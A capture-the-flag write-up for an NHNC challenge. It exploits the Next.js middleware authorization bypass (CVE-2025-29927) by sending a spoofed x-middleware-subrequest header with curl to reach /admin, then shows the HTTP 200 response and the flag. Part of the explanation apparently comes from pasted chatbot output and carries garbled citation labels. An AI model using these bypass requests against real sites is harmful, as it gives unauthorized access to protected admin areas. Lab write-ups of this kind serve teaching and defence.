

# Next Song is 春日影

NextJS Vulnerability at /admin

`Author: Frank`

[https://nhnc_next-song.frankk.uk](https://nhnc_next-song.frankk.uk/)


## Solve

## 💣 What is the issue?

There’s a critical flaw in Next.js middleware (CVE‑2025‑29927) where the internal header `x-middleware-subrequest` can be injected by an attacker to bypass **all** middleware logic—including authentication or authorization checks on protected routes (like `/admin`) [securitylabs.datadoghq.com+1github.com+1](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/?utm_source=chatgpt.com)[nvd.nist.gov+9picussecurity.com+9offsec.com+9](https://www.picussecurity.com/resource/blog/cve-2025-29927-nextjs-middleware-bypass-vulnerability?utm_source=chatgpt.com).

---

## 🧪 How to exploit it

1. Confirm that the server is running a **vulnerable Next.js version**: earlier than **12.3.5**, **13.5.9**, **14.2.25**, or **15.2.3** [picussecurity.com+7offsec.com+7securitylabs.datadoghq.com+7](https://www.offsec.com/blog/cve-2025-29927/?utm_source=chatgpt.com).
    
2. Ensure the path uses middleware, e.g., `/admin`.
    
3. Send a crafted HTTP request with a spoofed `x-middleware-subrequest` header:
    
    - **For versions 13+** (with `middleware.js` at root):
        
        nginx
        
        CopiarEditar
        
        `curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \   https://nhnc_next-song.frankk.uk/admin`
        
    - **For older versions** (Next.js 11–12 with `_middleware.js`):
        
        nginx
        
        CopiarEditar
        
        `curl -i -H "x-middleware-subrequest: _middleware" \   https://nhnc_next-song.frankk.uk/admin`
        
    
    If the middleware isn't triggered, and you still receive the admin content or a 200 response, the application is vulnerable [jfrog.com+1offsec.com+1](https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/?utm_source=chatgpt.com)[reddit.com+8github.com+8offsec.com+8](https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927?utm_source=chatgpt.com)[securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/?utm_source=chatgpt.com).

```
❯ curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  https://nhnc_next-song.frankk.uk/admin

HTTP/2 200
date: Mon, 07 Jul 2025 03:09:09 GMT
content-type: text/html; charset=utf-8
cf-ray: 95b4242f1a8c4763-DFW
cf-cache-status: DYNAMIC
report-to: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=NJJFMVRj3Vnpn54mlIVHjCEpVY0iloc%2BtU%2B2W7zg%2FWBj6CNYzliCDmlf5Ls7RZJqoggF7AYNDlHjahIQsrMarzitwZ6oxrmqAF6AJtAd7lM2toW40idVZ0bDq7spzMwo%2BrnXll3hAU8I4WGc3bU1304R53roWr8%3D"}],"group":"cf-nel","max_age":604800}
nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
strict-transport-security: max-age=15552000; preload
speculation-rules: "/cdn-cgi/speculation"
expect-ct: max-age=86400, enforce
referrer-policy: same-origin
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
server: cloudflare
alt-svc: h3=":443"; ma=86400
server-timing: cfL4;desc="?proto=TCP&rtt=41526&min_rtt=39984&rtt_var=8675&sent=7&recv=12&lost=0&retrans=0&sent_bytes=2883&recv_bytes=650&delivery_rate=89257&cwnd=253&unsent_bytes=0&cid=4ad995f16af8ef23&ts=845&x=0"

NHNC{ANon_iS_cUtE_RIGhT?}
```